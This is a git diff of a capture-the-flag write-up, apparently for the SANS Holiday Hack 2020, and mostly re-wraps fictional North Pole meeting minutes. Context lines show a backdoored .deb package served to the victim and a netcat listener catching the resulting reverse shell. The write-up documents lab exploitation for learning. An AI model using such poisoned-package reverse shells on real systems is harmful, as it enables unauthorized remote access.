@@ -272,7 +272,7 @@ For the exploit, we have to modify the `postinst` file in the dpkg that will be 
     10.6.6.35 - - [18/Dec/2020 02:38:55] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 200 -
     ```
 3. The victim sends a shell back to us and we can get the information we are after:
-    ```shell
+    ```
     guest@24fc902b00b2:~$ nc -lvvp 4444
     listening on [any] 4444 ...
     connect to [10.6.0.26] from arp_requester.guestnet0.kringlecastle.com [10.6.6.35] 44784
@@ -310,14 +310,26 @@ For the exploit, we have to modify the `postinst` file in the dpkg that will be 
                     Heat Miser
                     Father Time
 
-    Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.
+    Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this 
+    meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community 
+    website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.
 
     Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
 
     OLD BUSINESS: No Old Business.
 
     RESOLUTIONS:
-    The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  
+    The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to 
+    include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect 
+    Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put 
+    a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already 
+    been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden 
+    on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman 
+    Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to 
+    refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly 
+    taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  
+    Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given 
+    her adoption of Kris Kringle as a son early in his life.  
 
     Approved:
     Mother Nature
@@ -341,10 +353,16 @@ For the exploit, we have to modify the `postinst` file in the dpkg that will be 
 
     NEW BUSINESS:
 
-    Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out that the proposed new furnace is 900,000,000 BTUs, a figure she considers “incredibly high for a building that size, likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposal, recommending that Mr. Miser devise a more realistic and safe plan for Mr. Time’s castle heating system.
+    Father Time Castle, new oversized furnace to be installed by Heat Miser Furnace, Inc.  Mr. H. Miser described the plan 
+    for installing new furnace to replace the faltering one in Mr. Time’s 20,000 sq ft castle. Ms. G. Breaddie pointed out 
+    that the proposed new furnace is 900,000,000 BTUs, a figure she considers “incredibly high for a building that size, 
+    likely two orders of magnitude too high.  Why, it might burn the whole North Pole down!”  Mr. H. Miser replied with a 
+    laugh, “That’s the whole point!”  The board voted unanimously to reject the initial proposal, recommending that Mr. Miser 
+    devise a more realistic and safe plan for Mr. Time’s castle heating system.
 
 
-    Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.
+    Motion to adjourn – So moved, Krampus.  Second – Clarice. All in favor – aye. None opposed, although Chairman Frost made 
+    another note of his strong disagreement with the approval of the Kringle Castle expansion plan.  Meeting adjourned.
     ```
 
 Now we have our answer.
@@ -461,7 +479,8 @@ Block 129459 is the bad one and it contains a .bin file and a .pdf file. In the 
 “Jack Frost is the most wonderful, warmest, kindest, bravest being I’ve ever known in my life.”
                                                                         – The Abominable Snowman
 
-With acclaim like this, coming from folks who really know goodness when they see it, Jack Frost should undoubtedly be awarded a huge number of Naughty/Nice points.
+With acclaim like this, coming from folks who really know goodness when they see it, Jack Frost 
+should undoubtedly be awarded a huge number of Naughty/Nice points.
 
 Shinny Upatree
 3/24/2020
